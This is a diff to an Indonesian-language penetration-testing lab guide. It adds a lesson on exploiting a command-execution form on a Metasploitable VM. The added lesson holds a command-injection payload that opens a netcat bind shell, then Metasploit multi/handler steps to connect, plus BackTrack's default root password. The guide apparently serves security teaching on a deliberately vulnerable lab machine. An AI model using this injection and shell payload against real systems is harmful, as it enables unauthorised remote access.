@@ -46,7 +46,34 @@ Gambar 5
 ## Testing
 ### Lesson 4: Using Metasploit with Command Execution
 
-"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
+1. Jalankan Netcat pada Metasploit
+Klik tab Command Execution
+
+GAMbar 6
+
+Jalankan perintah
+```
+http://10.0.1.100;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
+```
+Ket = 10.0.1.100 -> ip Metasploitable
+GAMbar 7
+
+2. Start VIrtual OS backtrack, login dengan username : root, password: toor
+3. Buka start Menu ->BackTrack->Exploitation Tools->Network Exploitation tool->Metasploit Framework -> msf console
+Gambar 8
+
+4. Jalankan perintah-perintah berikut secara bergantian
+```
+use multi/handler
+set PAYLOAD linux/x86/shell/bind_tcp
+show options
+set RHOST 10.0.1.100
+```
+
+5. Jalankan perintah 
+```
+exploit
+```
 
 ### Lesson 5: Using Tamper Data with crack_web_form.pl
 
